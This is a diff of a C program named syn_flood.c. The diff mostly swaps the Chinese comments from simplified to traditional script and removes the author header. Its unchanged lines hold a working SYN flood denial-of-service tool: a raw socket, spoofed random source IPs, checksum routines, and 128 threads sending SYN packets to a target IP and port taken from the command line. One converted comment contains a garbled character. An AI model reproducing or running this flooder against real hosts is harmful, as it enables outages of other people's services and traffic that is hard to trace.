@@ -1,10 +1,3 @@
-/*************************************************************************
-    > File Name: syn_flood.c
-    > Author: Jiange
-    > Mail: jiangezh@qq.com 
-    > Created Time: 2016年01月01日 星期五 22时32分34秒
- ************************************************************************/
-
 #include <stdio.h>
 #include <ctype.h>
 #include <unistd.h>
@@ -24,19 +17,19 @@
 #include <netinet/tcp.h>
 #include "../header/packet_struct.h"
 
-/* 最多线程数 */
+/* 最多線程數 */
 #define MAXCHILD 128
 
 /* 原始套接字 */
 int sockfd;
 
-/* 程序活动标志 */
+/* 程序活動標誌 */
 static int alive = -1;
 
 char dst_ip[20] = { 0 };
 int dst_port;
 
-/* CRC16校验 */
+/* CRC16校驗 */
 unsigned short check_sum (unsigned short *buffer, unsigned short size){  
 
 	unsigned long cksum = 0;
@@ -56,14 +49,10 @@ unsigned short check_sum (unsigned short *buffer, unsigned short size){
 	return((unsigned short )(~cksum));
 }
 
-/* 发送SYN包函数
- * 填写IP头部，TCP头部
- * TCP伪头部仅用于校验和的计算
 
- */
 void init_header(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, struct pseudohdr *pseudoheader){
 	int len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-	// IP头部数据初始化
+	// IP頭部初始化
 	ip_hdr->version = 4;
 	ip_hdr->ihl = 5;
 	ip_hdr->tos = 0;
@@ -76,7 +65,7 @@ void init_header(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, struct pseudohdr 
 	ip_hdr->saddr = 0;
 	ip_hdr->daddr = inet_addr(dst_ip);
 
-	// TCP头部数据初始化
+	// TCP頭部初始化
 	tcp_hdr->th_sport = htons( rand()%16383 + 49152 );
 	tcp_hdr->th_dport = htons(dst_port);
 	tcp_hdr->th_seq = htonl( rand()%90000000 + 2345 ); 
@@ -86,7 +75,7 @@ void init_header(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, struct pseudohdr 
 	tcp_hdr->th_sum = 0;
 	tcp_hdr->th_urp = 0;
 
-	//TCP伪头部
+	//TCP偽頭部初始化
 	pseudoheader->zero = 0;
 	pseudoheader->protocol = IPPROTO_TCP;
 	pseudoheader->length = htons(sizeof(struct tcphdr));
@@ -96,36 +85,36 @@ void init_header(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, struct pseudohdr 
 }
 
 
-/* 发送SYN包函数
- * 填写IP头部，TCP头部
- * TCP伪头部仅用于校验和的计算
+/* 發送SYN包函数
+ * 填寫IP頭部，TCP頭部
+ * TCP偽頭部僅用於校驗和的计算
  */
 void* send_synflood(void *addr_info){
         struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
 	char buf[100], sendbuf[100];
 	int len;
-	struct iphdr ip_hdr;			//IP头部
-	struct tcphdr tcp_hdr;		//TCP头部
-	struct pseudohdr pseudoheader;	//TCP伪头部
+	struct iphdr ip_hdr;			//IP頭部
+	struct tcphdr tcp_hdr;		//TCP頭部
+	struct pseudohdr pseudoheader;	//TCP偽頭部
 
 
 	len = sizeof(struct iphdr) + sizeof(struct tcphdr);
 	
-	/* 初始化头部信息 */
+	/* 初始化頭部 */
 	init_header(&ip_hdr, &tcp_hdr, &pseudoheader);
 	
-	/* 处于活动状态时持续发送SYN包 */
+	/* 處於活動狀態時持續發送SYN包 */
 	while(alive){
 		ip_hdr.saddr = rand();
 
-		//计算IP校验和
+		//計算IP校驗和
 		bzero(buf, sizeof(buf));
 		memcpy(buf , &ip_hdr, sizeof(struct iphdr));
 		ip_hdr.check = check_sum((u_short *) buf, sizeof(struct iphdr));
 
 		pseudoheader.saddr = ip_hdr.saddr;
 
-		//计算TCP校验和
+		//計算TCP校驗和
 		bzero(buf, sizeof(buf));
 		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
 		memcpy(buf+sizeof(pseudoheader), &tcp_hdr, sizeof(struct tcphdr));
@@ -143,12 +132,12 @@ void* send_synflood(void *addr_info){
 	}
 }
 
-/* 信号处理函数,设置退出变量alive */
+/* 信號處理函數,設置退出變量alive */
 void sig_int(int signo){
 	alive = 0;
 }
 
-/* 主函数 */
+/* 主函數 */
 int main(int argc, char *argv[]){
 	struct sockaddr_in addr;
 	struct hostent * host = NULL;
@@ -159,10 +148,10 @@ int main(int argc, char *argv[]){
 	int err = -1;
 
 	alive = 1;
-	/* 截取信号CTRL+C */
+	/* 截取信號CTRL+C */
 	signal(SIGINT, sig_int);
 
-	/* 参数是否数量正确 */
+	/* 参數是否數量正鴂 */
 	if(argc < 3){
 		printf("usage: syn <IPaddress> <Port>\n");
 		exit(1);
@@ -177,7 +166,7 @@ int main(int argc, char *argv[]){
 	addr.sin_port = htons(dst_port);
 
 	if(inet_addr(dst_ip) == INADDR_NONE){
-		/* 为DNS地址，查询并转换成IP地址 */
+		/* 為DNS地址，查詢並轉換成IP地址 */
 		host = gethostbyname(argv[1]);
 		if(host == NULL){
 			perror("gethostbyname()");
@@ -202,16 +191,16 @@ int main(int argc, char *argv[]){
 		perror("socket()");
 		exit(1);
 	}
-	/* 设置IP选项 */
+	/* 設置IP選項 */
 	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0){
 		perror("setsockopt()");
 		exit(1);
 	}
 
-	/* 将程序的权限修改为普通用户 */
+	/* 將程序的權限修改為普通用户 */
 	setuid(getpid());
 
-	/* 建立多个线程协同工作 */
+	/* 建立多个線程協同工作 */
 	for(i=0; i<MAXCHILD; i++){
 		err = pthread_create(&pthread[i], NULL, send_synflood, (void *)&addr);
 		if(err != 0){
@@ -220,7 +209,7 @@ int main(int argc, char *argv[]){
 		}
 	}
 
-	/* 等待线程结束 */
+	/* 等待線程结束 */
 	for(i=0; i<MAXCHILD; i++){
 		err = pthread_join(pthread[i], NULL);
 		if(err != 0){
